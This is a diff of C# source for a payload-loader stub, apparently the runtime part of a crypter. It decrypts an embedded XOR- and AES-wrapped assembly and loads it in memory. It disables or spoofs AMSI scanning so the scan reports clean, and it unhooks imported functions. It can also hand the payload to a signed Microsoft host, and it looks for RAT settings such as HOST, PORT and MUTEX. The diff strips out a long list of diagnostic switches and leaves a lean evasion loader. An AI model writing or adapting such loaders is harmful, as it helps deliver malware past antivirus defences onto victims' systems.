-                                report.AppendLine("    entry " + key + " = byte[" + bytes.Length + "] " + EscapeBytes(bytes, 96));
-                                string runs = ExtractAsciiRuns(bytes, 16, 140);
-                                if (runs.Length > 0)
-                                {
-                                    report.AppendLine("      strings: " + Escape(runs));
-                                }
-                            }
-                            else
-                            {
-                                report.AppendLine("    entry " + key + " = " + (value == null ? "null" : Escape(value.GetType().Name + " " + Convert.ToString(value))));
-                            }
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                report.AppendLine("    not a resource set (" + ex.GetType().Name + ")");
-            }
-        }
-
-        private static string Escape(string value)
-        {
-            if (value == null)
-            {
-                return "null";
-            }
-            StringBuilder escaped = new StringBuilder();
-            for (int i = 0; i < value.Length; i++)
-            {
-                char c = value[i];
-                if (c >= 0x20 && c <= 0x7E)
-                {
-                    escaped.Append(c);
-                }
-                else
-                {
-                    escaped.Append("\\u" + ((int)c).ToString("X4"));
-                }
-            }
-            return escaped.ToString();
-        }
-
-        private static string ExtractAsciiRuns(byte[] data, int maxRuns, int maxLength)
-        {
-            StringBuilder runs = new StringBuilder();
-            StringBuilder current = new StringBuilder();
-            int found = 0;
-            for (int i = 0; i <= data.Length; i++)
-            {
-                bool printable = i < data.Length && data[i] >= 0x20 && data[i] < 0x7F;
-                if (printable)
-                {
-                    current.Append((char)data[i]);
-                    continue;
-                }
-
-                if (current.Length >= 4 && found < maxRuns)
-                {
-                    string text = current.ToString();
-                    if (text.Length > maxLength)
-                    {
-                        text = text.Substring(0, maxLength);
-                    }
-                    if (found > 0)
-                    {
-                        runs.Append(" | ");
-                    }
-                    runs.Append(text);
-                    found++;
-                }
-                current.Length = 0;
-            }
-            return runs.ToString();
-        }
-
-        private static string EscapeBytes(byte[] data, int max)
-        {
-            StringBuilder escaped = new StringBuilder();
-            int limit = Math.Min(max, data.Length);
-            for (int i = 0; i < limit; i++)
-            {
-                byte b = data[i];
-                escaped.Append(b >= 0x20 && b < 0x7F ? (char)b : '.');
-            }
-            if (data.Length > limit)
-            {
-                escaped.Append("...");
-            }
-            return escaped.ToString();
-        }
-
-        private static bool LooksLikeConfigName(string memberName)
-        {
-            string[] keywords = new string[] { "INSTALL", "HOST", "PORT", "MUTEX", "SUBNET", "RECONNECT", "PASSWORD", "PERSIST", "STARTUP", "USERNAME", "DOMAIN", "AUTHENTICATION" };
-            for (int i = 0; i < keywords.Length; i++)
-            {
-                if (memberName.IndexOf(keywords[i], StringComparison.OrdinalIgnoreCase) >= 0)
-                {
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        private static string SafeFieldValue(FieldInfo field)
-        {
-            try
-            {
-                object raw = field.GetValue(null);
-                return raw == null ? "null" : Convert.ToString(raw);
-            }
-            catch (Exception ex)
-            {
-                return "<" + ex.GetType().Name + ">";
-            }
-        }
-
-        private static string SafePropertyValue(PropertyInfo property, object instance)
-        {
-            try
-            {
-                if (property.GetIndexParameters().Length > 0)
-                {
-                    return "<indexed>";
-                }
-                object raw = property.GetValue(instance, null);
-                return raw == null ? "null" : Convert.ToString(raw);
-            }
-            catch (Exception ex)
-            {
-                return "<" + ex.GetType().Name + ">";
-            }
-        }
-
-        private static string DescribeMethod(MethodInfo method)
-        {
-            if (method == null)
-            {
-                return "<none>";
-            }
-
-            StringBuilder signature = new StringBuilder();
-            signature.Append(method.DeclaringType == null ? "?" : method.DeclaringType.FullName);
-            signature.Append("::");
-            signature.Append(method.Name);
-            signature.Append("(");
-            ParameterInfo[] parameters = method.GetParameters();
-            for (int i = 0; i < parameters.Length; i++)
-            {
-                if (i > 0)
-                {
-                    signature.Append(", ");
-                }
-                signature.Append(parameters[i].ParameterType.Name);
-            }
-            signature.Append(")");
-            return signature.ToString();
-        }
-
-        // Diagnostic switches so a single packed file can be exercised without repacking.
-        //   --nc-hold=<seconds> : load the payload but never run it, stay alive that long
-        //   --nc-delay=<seconds>: wait <seconds> after loading before the payload entry
-        //                         point runs (default 0; the wait is opt-in)
-        //   --nc-file           : write the payload to a temp file and load it from disk
-        //   --nc-map            : default. stage the payload as masked bytes, place the
-        //                         image into the carrier through a mapped view, then load
-        //                         that file so the running image is file backed
-        //   --nc-mem            : previous behaviour, load the image straight from memory
-        //   --nc-inspect        : report the payload's types, resources and settings, then stop
-        //   --nc-unhook         : put the runtime's import table back before the payload runs
-        //                         (default; kept so existing test lines still work)
-        //   --nc-keepimports    : leave the runtime's import table hooked while the payload
-        //                         runs (opt-out of the default restore)
-        //   --nc-jit            : compile every payload method to native code without running
-        //                         any of it; separates a content scan from behaviour scoring
-        //   --nc-watch          : run normally, but log tcp connections / new processes while
-        //                         the payload entry point is executing
-        //   --nc-throttle[=s,r] : duty cycle every other thread of the process, <s>ms
-        //                         suspended out of every <s>+<r>ms (default 100,100), so the
-        //                         payload runs unchanged but its behaviour is spread in time
-        //   --nc-dropwatch      : log, with millisecond timestamps, every file that appears
-        //                         or disappears in the temp directory, and dump its bytes
-        //   --nc-apitrace       : same as --nc-watch, plus a live log of every native entry
-        //   --nc-sinkhole=<list>: replace the built-in sinkhole list for this run, so the
-        //                         list can be bisected without repacking; separators are ;
-        //                         and , and an empty value disables the mechanism
-        //   --nc-argtrace       : log the arguments of file and process creation the payload
-        //                         performs, and dump the bytes of any script it drops
-        //                         point the payload resolves through the runtime
-        //   --nc-probe[=h:p]    : load the payload, then act out its startup actions one
-        //                         phase at a time (tcp connect / tls handshake / wmi query)
-        //   --nc-invoke         : with --nc-hold, run the payload once the hold expires
-        //   --nc-noconnect      : run normally, but every outbound connect() fails
-        //   --nc-keepamsi       : run normally without restoring the scan entry name
-        //   --nc-skipamsi       : load the payload without neutralizing the scan entry
-        //   --nc-rpatch         : neutralize the scan entry by rewriting its first bytes
-        //                         instead of blanking its export name
-        //   --nc-lookup         : leave the provider untouched and intercept the runtime's
-        //                         own lookup of the scan entry instead
-        //   --nc-rename         : force the previous behaviour, blanking the scan entry name
-        //   --nc-resultstub     : answer the runtime's scan entry lookup with a routine that
-        //                         always reports a clean verdict
-        //   --nc-emit[=<sec>]   : build and run dynamic methods for <sec>s (default 10), then
-        //                         stop, without running the payload
-        //   --nc-heartbeat[=<s>]: log a line every <s>s (default 5) so a log that simply goes
-        //                         quiet can be told apart from a process that was stopped
-        //   --nc-perturb[=<n>]  : append <n> random bytes (default 128) to the payload
-        //   --nc-control=<path> : run the managed assembly at <path> instead of the
-        //                         embedded payload, through the exact same loader path
-        //   --nc-host=<mode>    : stage the payload under a one time pad and let a
-        //                         Microsoft signed host (<mode>: msbuild, ps) load and
-        //                         run it, so this unsigned file never touches it
-        //   --nc-hostwait=<sec> : how long to wait for the host (0 = do not wait,
-        //                         default is to wait for the host to finish)
-        //   --nc-hosthold=<sec> : keep the host alive <sec>s after the payload entry
-        //                         point returns (default 0 = follow the payload)
-        private static void ApplyRuntimeOptions()
-        {
-            string[] args = Environment.GetCommandLineArgs();
-            for (int i = 1; i < args.Length; i++)
-            {
-                string argument = args[i];
-                if (argument.StartsWith("--nc-hold=", StringComparison.OrdinalIgnoreCase))
-                {
-                    int seconds;
-                    if (Int32.TryParse(argument.Substring("--nc-hold=".Length), out seconds) && seconds >= 0)
-                    {
-                        holdSeconds = seconds;
-                        Log("option: hold=" + seconds + "s");
-                    }
-                }
-                else if (argument.Equals("--nc-file", StringComparison.OrdinalIgnoreCase))
-                {
-                    fileBackedLoad = true;
-                    Log("option: file-backed load");
-                }
-                else if (argument.Equals("--nc-map", StringComparison.OrdinalIgnoreCase))
-                {
-                    mapBackedLoad = true;
-                    Log("option: mapped file-backed load");
-                }
-                else if (argument.Equals("--nc-mem", StringComparison.OrdinalIgnoreCase))
-                {
-                    mapBackedLoad = false;
-                    Log("option: in-memory load (previous behaviour)");
-                }
-                else if (argument.Equals("--nc-inspect", StringComparison.OrdinalIgnoreCase))
-                {
-                    inspectRequested = true;
-                    Log("option: inspect");
-                }
-                else if (argument.Equals("--nc-watch", StringComparison.OrdinalIgnoreCase))
-                {
-                    watchRequested = true;
-                    Log("option: watch");
-                }
-                else if (argument.Equals("--nc-dropwatch", StringComparison.OrdinalIgnoreCase))
-                {
-                    dropWatchRequested = true;
-                    Log("option: dropwatch for files created in the temp directory");
-                }
-                else if (argument.StartsWith("--nc-throttle", StringComparison.OrdinalIgnoreCase))
-                {
-                    throttleRequested = true;
-                    int throttleSeparator = argument.IndexOf('=');
-                    if (throttleSeparator > 0)
-                    {
-                        string[] pacing = argument.Substring(throttleSeparator + 1).Split(new char[] { ',', ';' }, StringSplitOptions.RemoveEmptyEntries);
-                        int suspended;
-                        int running;
-                        if (pacing.Length == 2 &&
-                            Int32.TryParse(pacing[0], out suspended) &&
-                            Int32.TryParse(pacing[1], out running) &&
-                            suspended > 0 && suspended <= 5000 && running >= 0 && running <= 5000)
-                        {
-                            throttleSuspendMs = suspended;
-                            throttleResumeMs = running;
-                        }
-                    }
-                    Log("option: throttle " + throttleSuspendMs + "ms suspended / " + throttleResumeMs + "ms running");
-                }
-                else if (argument.StartsWith("--nc-heartbeat", StringComparison.OrdinalIgnoreCase))
-                {
-                    heartbeatSeconds = 5;
-                    int heartbeatSeparator = argument.IndexOf('=');
-                    if (heartbeatSeparator > 0)
-                    {
-                        int seconds;
-                        if (Int32.TryParse(argument.Substring(heartbeatSeparator + 1), out seconds) && seconds > 0)
-                        {
-                            heartbeatSeconds = seconds;
-                        }
-                    }
-                    Log("option: heartbeat every " + heartbeatSeconds + "s");
-                }
-                else if (argument.Equals("--nc-apitrace", StringComparison.OrdinalIgnoreCase))
-                {
-                    apiTraceRequested = true;
-                    watchRequested = true;
-                    Log("option: apitrace");
-                }
-                else if (argument.StartsWith("--nc-sinkhole=", StringComparison.OrdinalIgnoreCase))
-                {
-                    string requested = argument.Substring("--nc-sinkhole=".Length);
-                    string[] parts = requested.Split(new char[] { ';', ',' }, StringSplitOptions.RemoveEmptyEntries);
-                    List<string> selected = new List<string>();
-                    for (int part = 0; part < parts.Length; part++)
-                    {
-                        string candidate = parts[part].Trim();
-                        if (candidate.Length > 0)
-                        {
-                            selected.Add(candidate);
-                        }
-                    }
-                    sinkholeNames = selected.ToArray();
-                    Log("option: sinkhole=" + (sinkholeNames.Length == 0 ? "(none)" : String.Join(",", sinkholeNames)));
-                }
-                else if (argument.Equals("--nc-argtrace", StringComparison.OrdinalIgnoreCase))
-                {
-                    argumentTraceRequested = true;
-                    watchRequested = true;
-                    Log("option: argument trace for file and process creation");
-                }
-                else if (argument.Equals("--nc-invoke", StringComparison.OrdinalIgnoreCase))
-                {
-                    invokeAfterHold = true;
-                    Log("option: invoke after hold");
-                }
-                else if (argument.Equals("--nc-skipamsi", StringComparison.OrdinalIgnoreCase))
-                {
-                    skipAmsiRequested = true;
-                    Log("option: skip amsi entry neutralization");
-                }
-                else if (argument.Equals("--nc-rpatch", StringComparison.OrdinalIgnoreCase))
-                {
-                    patchEntryRequested = true;
-                    Log("option: rewrite scan entry bytes instead of blanking the name");
-                }
-                else if (argument.Equals("--nc-lookup", StringComparison.OrdinalIgnoreCase))
-                {
-                    lookupBlockRequested = true;
-                    Log("option: intercept runtime lookups of the scan entry");
-                }
-                else if (argument.Equals("--nc-rename", StringComparison.OrdinalIgnoreCase))
-                {
-                    renameEntryRequested = true;
-                    Log("option: rename the scan entry export instead of opting out");
-                }
-                else if (argument.Equals("--nc-resultstub", StringComparison.OrdinalIgnoreCase))
-                {
-                    resultStubRequested = true;
-                    Log("option: answer scan entry lookups with a clean-reporting routine");
-                }
-                else if (argument.Equals("--nc-unhook", StringComparison.OrdinalIgnoreCase))
-                {
-                    unhookAfterLoad = true;
-                    Log("option: restore the import table before running the payload");
-                }
-                else if (argument.Equals("--nc-keepimports", StringComparison.OrdinalIgnoreCase))
-                {
-                    unhookAfterLoad = false;
-                    Log("option: leave the runtime import table hooked while the payload runs");
-                }
-                else if (argument.Equals("--nc-jit", StringComparison.OrdinalIgnoreCase))
-                {
-                    jitRequested = true;
-                    Log("option: prepare payload code without running it");
-                }
-                else if (argument.Equals("--nc-modinit", StringComparison.OrdinalIgnoreCase))
-                {
-                    modInitRequested = true;
-                    Log("option: run the payload module initializer only");
-                }
-                else if (argument.StartsWith("--nc-runms=", StringComparison.OrdinalIgnoreCase))
-                {
-                    runMilliseconds = int.Parse(argument.Substring("--nc-runms=".Length));
-                    Log("option: payload lifetime " + runMilliseconds + "ms");
-                }
-                else if (argument.StartsWith("--nc-emit", StringComparison.OrdinalIgnoreCase))
-                {
-                    emitSeconds = 10;
-                    int emitSeparator = argument.IndexOf('=');
-                    if (emitSeparator > 0)
-                    {
-                        int seconds;
-                        if (Int32.TryParse(argument.Substring(emitSeparator + 1), out seconds) && seconds >= 0)
-                        {
-                            emitSeconds = seconds;
-                        }
-                    }
-                    Log("option: emit dynamic methods for " + emitSeconds + "s");
-                }
-                else if (argument.StartsWith("--nc-perturb", StringComparison.OrdinalIgnoreCase))
-                {
-                    perturbBytes = 128;
-                    int sizeSeparator = argument.IndexOf('=');
-                    if (sizeSeparator > 0)
-                    {
-                        int size;
-                        if (Int32.TryParse(argument.Substring(sizeSeparator + 1), out size) && size >= 0)
-                        {
-                            perturbBytes = size;
-                        }
-                    }
-                    Log("option: perturb payload with " + perturbBytes + " trailing bytes");
-                }
-                else if (argument.StartsWith("--nc-delay=", StringComparison.OrdinalIgnoreCase))
-                {
-                    int seconds;
-                    if (Int32.TryParse(argument.Substring("--nc-delay=".Length), out seconds) && seconds >= 0)
-                    {
-                        payloadDelaySeconds = seconds;
-                        Log("option: delay=" + seconds + "s before the payload entry point");
-                    }
-                }
-                else if (argument.StartsWith("--nc-control=", StringComparison.OrdinalIgnoreCase))
-                {
-                    controlPath = argument.Substring("--nc-control=".Length).Trim('"');
-                    Log("option: control payload=" + controlPath);
-                }
-                else if (argument.StartsWith("--nc-host=", StringComparison.OrdinalIgnoreCase))
-                {
-                    hostMode = argument.Substring("--nc-host=".Length).Trim('"').Trim();
-                    Log("option: host=" + hostMode);
-                }
-                else if (argument.StartsWith("--nc-hostwait=", StringComparison.OrdinalIgnoreCase))
-                {
-                    int seconds;
-                    if (Int32.TryParse(argument.Substring("--nc-hostwait=".Length), out seconds) && seconds >= 0)
-                    {
-                        hostWaitSeconds = seconds;
-                        Log("option: host wait=" + seconds + "s");
-                    }
-                }
-                else if (argument.StartsWith("--nc-hosthold=", StringComparison.OrdinalIgnoreCase))
-                {
-                    int seconds;
-                    if (Int32.TryParse(argument.Substring("--nc-hosthold=".Length), out seconds) && seconds >= 0)
-                    {
-                        hostHoldSeconds = seconds;
-                        Log("option: host hold=" + seconds + "s");
-                    }
-                }
-                else if (argument.Equals("--nc-keepamsi", StringComparison.OrdinalIgnoreCase))
-                {
-                    keepInspectionDisabled = true;
-                    Log("option: keep amsi entry neutralized");
-                }
-                else if (argument.Equals("--nc-noconnect", StringComparison.OrdinalIgnoreCase))
-                {
-                    noConnectRequested = true;
-                    watchRequested = true;
-                    Log("option: neutralize ws2_32 connect");
-                }
-                else if (argument.StartsWith("--nc-probe", StringComparison.OrdinalIgnoreCase))
-                {
-                    probeRequested = true;
-                    watchRequested = true;
-                    int separator = argument.IndexOf('=');
-                    if (separator > 0)
-                    {
-                        string endpoint = argument.Substring(separator + 1);
-                        int colon = endpoint.LastIndexOf(':');
-                        int port;
-                        if (colon > 0 && Int32.TryParse(endpoint.Substring(colon + 1), out port) && port > 0)
-                        {
-                            probeHost = endpoint.Substring(0, colon);
-                            probePort = port;
-                        }
-                    }
-                    Log("option: probe " + probeHost + ":" + probePort);
-                }
-            }
+            AppDomain.CurrentDomain.AssemblyResolve += ResolveAssembly;
+            RunPayloadImage(image);
         }
 
         [STAThread]
         static void Main()
         {
-            EnableLoggingIfDiagnosticRequested();
-            LogInspectionStage("STATIC", "RUNTIME_REACHED", "stub entry point started; any pre-execution static inspection is external and cannot be confirmed here");
-            ApplyRuntimeOptions();
-
-            if (RunExitMonitorIfRequested())
-            {
-                return;
-            }
-
-            InstallDiagnostics();
-            if (heartbeatSeconds > 0)
-            {
-                StartHeartbeat();
-            }
-            if (apiTraceRequested || lookupBlockRequested || argumentTraceRequested || sinkholeNames.Length > 0)
-            {
-                InstallApiTrace();
-                if (sinkholeNames.Length > 0)
-                {
-                    Log("sinkhole: " + sinkholeNames.Length + " export(s) will be answered with a no-op stub");
-                }
-            }
-            if (watchRequested || apiTraceRequested)
-            {
-                StartWatch();
-            }
-            if (dropWatchRequested)
-            {
-                StartDropWatch();
-            }
 
             try
             {
-                currentStage = "reading encrypted payload";
                 byte[] app = GetPayload();
 
-                currentStage = "reversing xor layer";
                 app = Xor(app, Convert.FromBase64String(xorKey));
 
-                currentStage = "decrypting payload";
                 RijndaelManaged rijndael = new RijndaelManaged();
                 rijndael.KeySize = 256;
                 rijndael.BlockSize = 128;
@@ -4072,23 +1260,10 @@ namespace stub
                 {
                     throw new Exception("Decrypted payload too small (" + decrypted.Length + " bytes). Key/IV mismatch or payload truncated.");
                 }
-                LogInspectionStage("MEMORY", "PAYLOAD_DECRYPTED", "decrypted payload container is resident in process memory");
 
-                currentStage = "parsing payload container";
                 // ---- parse payload container ----
                 byte[] mainData;
                 int count = 0;
-                if (controlPath != null)
-                {
-                    if (!File.Exists(controlPath))
-                    {
-                        throw new FileNotFoundException("control payload not found: " + controlPath);
-                    }
-                    mainData = File.ReadAllBytes(controlPath);
-                    dependencies.Clear();
-                    Log("control: using " + controlPath + " (" + mainData.Length + " bytes) in place of the embedded payload");
-                }
-                else
                 using (MemoryStream container = new MemoryStream(decrypted))
                 using (BinaryReader reader = new BinaryReader(container))
                 {
@@ -4125,263 +1300,58 @@ namespace stub
                         throw new Exception("Payload truncated while parsing container (count=" + count + ", position=" + container.Position + ", length=" + container.Length + "). Old packed output or packer/stub mismatch.");
                     }
                 }
-                Log("payload decoded; dependencies=" + count + ", main len=" + mainData.Length);
-                Log("payload md5=" + HashHex(mainData));
-
-                if (perturbBytes > 0)
-                {
-                    byte[] original = mainData;
-                    byte[] perturbed = new byte[original.Length + perturbBytes];
-                    Buffer.BlockCopy(original, 0, perturbed, 0, original.Length);
-                    using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
-                    {
-                        rng.GetBytes(perturbed, original.Length, perturbBytes);
-                    }
-                    Log("perturb: " + original.Length + " bytes md5=" + HashHex(original) + " -> " + perturbed.Length + " bytes md5=" + HashHex(perturbed));
-                    mainData = perturbed;
-                }
-
                 AppDomain.CurrentDomain.AssemblyResolve += ResolveAssembly;
 
                 if (hostMode != null && hostMode.Length > 0)
                 {
-                    currentStage = "handing the payload to a signed host";
                     RunPayloadInHost(mainData);
-                    Log("host: returning after the host process");
                     return;
                 }
 
-                currentStage = "adjusting inspection entry";
-                LogInspectionStage("AMSI", "PREPARE_BEGIN", "inspection setup reached; external scan execution is not directly observable");
                 PrepareInspection();
-                LogInspectionStage("AMSI", "PREPARE_COMPLETE", "inspection setup returned");
 
-                currentStage = "loading main assembly";
                 Assembly newAssembly;
-                LogInspectionStage("MEMORY", "ASSEMBLY_LOAD_BEGIN", mapBackedLoad || fileBackedLoad
-                    ? "managed payload assembly load started from a file-backed image"
-                    : "managed payload image is about to be loaded from memory");
-                LogInspectionStage("AMSI", "LOAD_OPPORTUNITY", "managed assembly load reached; this is an AMSI observation point, not proof of a scan");
-                if (mapBackedLoad)
+                try
                 {
-                    newAssembly = LoadMaterializedAssembly(mainData);
+                    newAssembly = Assembly.Load(mainData);
                 }
-                else if (fileBackedLoad)
+                catch
                 {
-                    string payloadPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".dll");
-                    File.WriteAllBytes(payloadPath, mainData);
-                    Log("file-backed load: wrote " + mainData.Length + " bytes to " + payloadPath);
-                    newAssembly = Assembly.LoadFile(payloadPath);
-                    Log("assembly loaded");
-                    try
+                    if (amsiFallbackUsed)
                     {
-                        File.Delete(payloadPath);
-                        Log("file-backed load: temp file removed");
+                        throw;
                     }
-                    catch (Exception deleteError)
-                    {
-                        Log("file-backed load: temp file left in place: " + deleteError.Message);
-                    }
-                }
-                else
-                {
-                    try
-                    {
-                        newAssembly = Assembly.Load(mainData);
-                    }
-                    catch (Exception loadError)
-                    {
-                        if (amsiFallbackUsed || skipAmsiRequested || lookupBlockRequested || resultStubRequested || renameEntryRequested)
-                        {
-                            throw;
-                        }
-                        amsiFallbackUsed = true;
-                        Log("load blocked: " + InnerMessage(loadError));
-                        Log("load blocked: retrying with the clean-result stub");
-                        InstallScanResultStub();
-                        newAssembly = Assembly.Load(mainData);
-                    }
-                    Log("assembly loaded");
-                }
-                LogInspectionStage("MEMORY", "ASSEMBLY_LOAD_COMPLETE", "managed payload assembly load returned");
-                LogInspectionStage("AMSI", "LOAD_RETURNED", "managed assembly load returned; no scanner verdict is available to this process");
-                Log("assembly name: " + newAssembly.FullName);
-
-                if (neutralizeInspectionEntry)
-                {
-                    if (keepInspectionDisabled)
-                    {
-                        Log("inspection: provider left neutralized for the whole run");
-                    }
-                    else
-                    {
-                        currentStage = "restoring inspection entry";
-                        RestoreInspectionEntry();
-                    }
+                    amsiFallbackUsed = true;
+                    InstallScanResultStub();
+                    newAssembly = Assembly.Load(mainData);
                 }
 
-                if (unhookAfterLoad && !apiTraceRequested && !argumentTraceRequested && sinkholeNames.Length == 0)
-                {
-                    currentStage = "restoring the runtime import table";
-                    RestorePatchedImports();
-                }
-                else if (apiTraceRequested)
-                {
-                    Log("unhook: skipped because the api trace is active; the runtime trace stays installed");
-                }
+                RestoreInspectionEntry();
 
-                if (jitRequested)
-                {
-                    currentStage = "preparing payload code";
-                    JitPayloadMethods(newAssembly);
-                    if (holdSeconds < 0)
-                    {
-                        Log("jit: returning without running the payload");
-                        return;
-                    }
-                    Log("jit: falling through to the hold window");
-                }
+                RestorePatchedImports();
 
-                if (modInitRequested)
-                {
-                    currentStage = "preparing payload module initializer";
-                    Log("modinit: running the module initializer only");
-                    try
-                    {
-                        System.Runtime.CompilerServices.RuntimeHelpers.RunModuleConstructor(newAssembly.ManifestModule.ModuleHandle);
-                        Log("modinit: module initializer completed");
-                    }
-                    catch (Exception modInitError)
-                    {
-                        LogException("MODULE INITIALIZER FAILED", modInitError);
-                    }
-                    if (holdSeconds < 0)
-                    {
-                        Log("modinit: returning without running the payload");
-                        return;
-                    }
-                    Log("modinit: falling through to the hold window");
-                }
-
-                if (noConnectRequested)
-                {
-                    currentStage = "neutralizing outbound connect";
-                    NeutralizeConnect();
-                }
-
-                if (inspectRequested)
-                {
-                    currentStage = "inspecting payload assembly";
-                    InspectAssembly(newAssembly, mainData);
-                    Log("inspect: returning without running the payload");
-                    return;
-                }
-
-                if (emitSeconds >= 0)
-                {
-                    currentStage = "replaying dynamic method generation";
-                    RunEmitReplay();
-                    return;
-                }
-
-                if (probeRequested)
-                {
-                    currentStage = "probing payload behaviours";
-                    RunProbes();
-                    Log("probe: returning without running the payload");
-                    return;
-                }
-
-                if (holdSeconds >= 0)
-                {
-                    currentStage = "holding after payload load";
-                    Log("hold: staying alive " + holdSeconds + "s without running the payload");
-                    for (int remaining = holdSeconds; remaining > 0; remaining -= 10)
-                    {
-                        Thread.Sleep(10000);
-                        Log("hold: " + Math.Max(remaining - 10, 0) + "s left");
-                    }
-                    if (!invokeAfterHold)
-                    {
-                        Log("hold: finished; returning without running the payload");
-                        return;
-                    }
-                    Log("hold: finished; running the payload after the delay");
-                }
-
-                if (payloadDelaySeconds > 0)
-                {
-                    currentStage = "delaying before running the payload";
-                    Log("delay: waiting " + payloadDelaySeconds + "s before running the payload");
-                    Thread.Sleep(payloadDelaySeconds * 1000);
-                    Log("delay: done");
-                }
-
-                currentStage = "resolving payload entry point";
                 MethodInfo entryPoint = newAssembly.EntryPoint;
                 if (entryPoint == null)
                 {
                     throw new MissingMethodException("Loaded assembly does not have an entry point.");
                 }
                 ParameterInfo[] parameters = entryPoint.GetParameters();
-                Log("entry: " + entryPoint.Name);
-                if (runMilliseconds > 0)
+                if (parameters.Length == 0)
                 {
-                    Thread lifetimeTimer = new Thread(delegate()
-                    {
-                        Thread.Sleep(runMilliseconds);
-                        Log("runms: lifetime elapsed; terminating the process");
-                        Environment.Exit(0);
-                    });
-                    lifetimeTimer.IsBackground = true;
-                    lifetimeTimer.Start();
-                    Log("runms: process will terminate after " + runMilliseconds + "ms");
+                    entryPoint.Invoke(null, null);
                 }
-                currentStage = "running payload entry point";
-                if (throttleRequested)
+                else
                 {
-                    StartThrottle();
+                    entryPoint.Invoke(null, new object[] { new string[0] });
                 }
-                LogInspectionStage("BEHAVIOR", "ENTRYPOINT_BEGIN", "payload entry point invocation started");
-                try
-                {
-                    if (parameters.Length == 0)
-                    {
-                        entryPoint.Invoke(null, null);
-                    }
-                    else
-                    {
-                        entryPoint.Invoke(null, new object[] { new string[0] });
-                    }
-                    LogInspectionStage("BEHAVIOR", "ENTRYPOINT_RETURNED", "payload entry point returned");
-                }
-                catch (TargetInvocationException entryError)
-                {
-                    LogInspectionStage("BEHAVIOR", "ENTRYPOINT_THREW", entryError.GetType().FullName);
-                    LogException("PAYLOAD ENTRY POINT THREW", entryError);
-                    throw;
-                }
-                finally
-                {
-                    throttleStop = true;
-                }
-                currentStage = "payload entry point returned";
-                Log("entry returned");
             }
             catch (Exception exz)
             {
-                LogException("STUB CAUGHT EXCEPTION", exz);
-                currentStage = "showing error dialog";
                 try
                 {
                     MessageBox.Show(GENERIC_ERROR + "\n\n" + InnerMessage(exz), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
-                catch (Exception dialogError)
-                {
-                    LogException("ERROR DIALOG FAILED", dialogError);
-                }
-                currentStage = "stub returning after caught exception";
-                Log("stub main returning after caught exception");
+                catch { }
             }
 
         }
